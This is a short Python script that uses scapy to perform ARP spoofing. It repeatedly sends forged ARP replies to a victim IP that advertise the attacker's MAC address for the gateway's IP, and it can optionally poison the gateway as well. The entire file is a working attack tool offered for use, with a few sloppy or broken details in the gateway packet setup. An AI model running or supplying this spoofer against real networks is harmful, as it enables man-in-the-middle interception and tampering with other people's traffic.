import scapy
import argparse
import time
from scapy.all import *

# Defaults
IFACE = conf.route.route("0.0.0.0")[0]
SRC = conf.route.route("0.0.0.0")[2] # SRC = gateway ip
TARGET = None

# Arguments
parser = argparse.ArgumentParser(description='Spoof ARP tables')
parser.add_argument("-i","--iface",dest="IFACE",default=IFACE,help="Interface you wish to use")
parser.add_argument("-s","--src",dest="SRC",default=SRC,help="The address you want for the attacker")
parser.add_argument("-d","--delay",dest="DELAY",default=1,help="Delay (in seconds) between messages")
parser.add_argument("-gw","--gateway",action="store_true",help="should GW be attacked as well")
parser.add_argument("-t","--target",dest="TARGET",default=None,help="IP of target", required=True)

args = parser.parse_args()
print(args)

DELAY = float(args.DELAY)
if args.IFACE:
    IFACE = args.IFACE
our_mac=get_if_hwaddr(IFACE) # mac address of this interface

if args.SRC:
    SRC = args.SRC

# get target ip
TARGET = args.TARGET


# # packet for target
# 2. ARP payload
arp_reply = ARP(
    op=2,                # 2 = is-at (ARP reply)
    psrc= SRC,  # the IP you're claiming to be (e.g., gateway)
    pdst= TARGET, # the victim's IP
    hwsrc= our_mac, # the MAC you want to advertise
)

# # packet for gateway
# 1. Ethernet header
ethgw = Ether()
ethgw.src = our_mac                     # sender MAC
ethgw.dst = TARGET                     # unicast reply


# 2. ARP payload (op=2 === is-at)
arp_gw = ARP(
	op=2,  # 2 = is-at (ARP reply)
	psrc=TARGET,  # the IP you're claiming to be (e.g., gateway)
	pdst="0.0.0.0",  # the victim's IP
	hwsrc=our_mac,  # the MAC you want to advertise
)


while True:
    send(arp_reply, verbose = True)
    print("Sent ARP table to {}".format(TARGET))
    if args.gateway:
        send(arp_gw, verbose = True)
        print("Sent ARP table to gateway")
    time.sleep(DELAY)